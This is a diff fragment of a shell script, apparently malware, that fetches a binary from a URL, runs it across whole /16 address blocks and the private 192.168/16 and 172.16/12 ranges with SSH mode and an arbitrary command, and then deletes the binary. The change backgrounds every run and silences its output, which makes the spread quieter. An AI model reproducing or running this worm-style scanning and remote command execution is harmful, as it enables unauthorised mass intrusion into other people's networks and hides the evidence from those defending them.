@@ -78,7 +78,7 @@ if download_file "$DOWNLOAD_URL" "$LOCAL_NAME"; then
     chmod +x "$LOCAL_NAME"
 fi
 for b in $(get_b_segments); do
-    nohup $LOCAL_NAME -cidr "$b.0.0/16" -c "$CMD" &
+    nohup "$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD" >/dev/null 2>&1 &
 done
 rm -rf "$LOCAL_NAME"
 
@@ -90,10 +90,10 @@ if download_file "$furl" "$LOCAL_NAME"; then
     chmod +x "$LOCAL_NAME"
 fi
 for b in $(get_b_segments); do
-    $LOCAL_NAME -h "$b.0.0/16" -c "$CMD" -m ssh -np -no
+    nohup "$LOCAL_NAME" -h "$b.0.0/16" -c "$CMD" -m ssh -np -no >/dev/null 2>&1 &
 done
-nohup $LOCAL_NAME -h 192.168.0.1/16 -c "$CMD" -m ssh -np -no &
-nohup $LOCAL_NAME -h 172.16.0.1/12 -c "$CMD" -m ssh -no &
+nohup "$LOCAL_NAME" -h 192.168.0.1/16 -c "$CMD" -m ssh -np -no >/dev/null 2>&1 &
+nohup "$LOCAL_NAME" -h 172.16.0.1/12 -c "$CMD" -m ssh -no >/dev/null 2>&1 &
 rm -rf "$LOCAL_NAME"
 
 
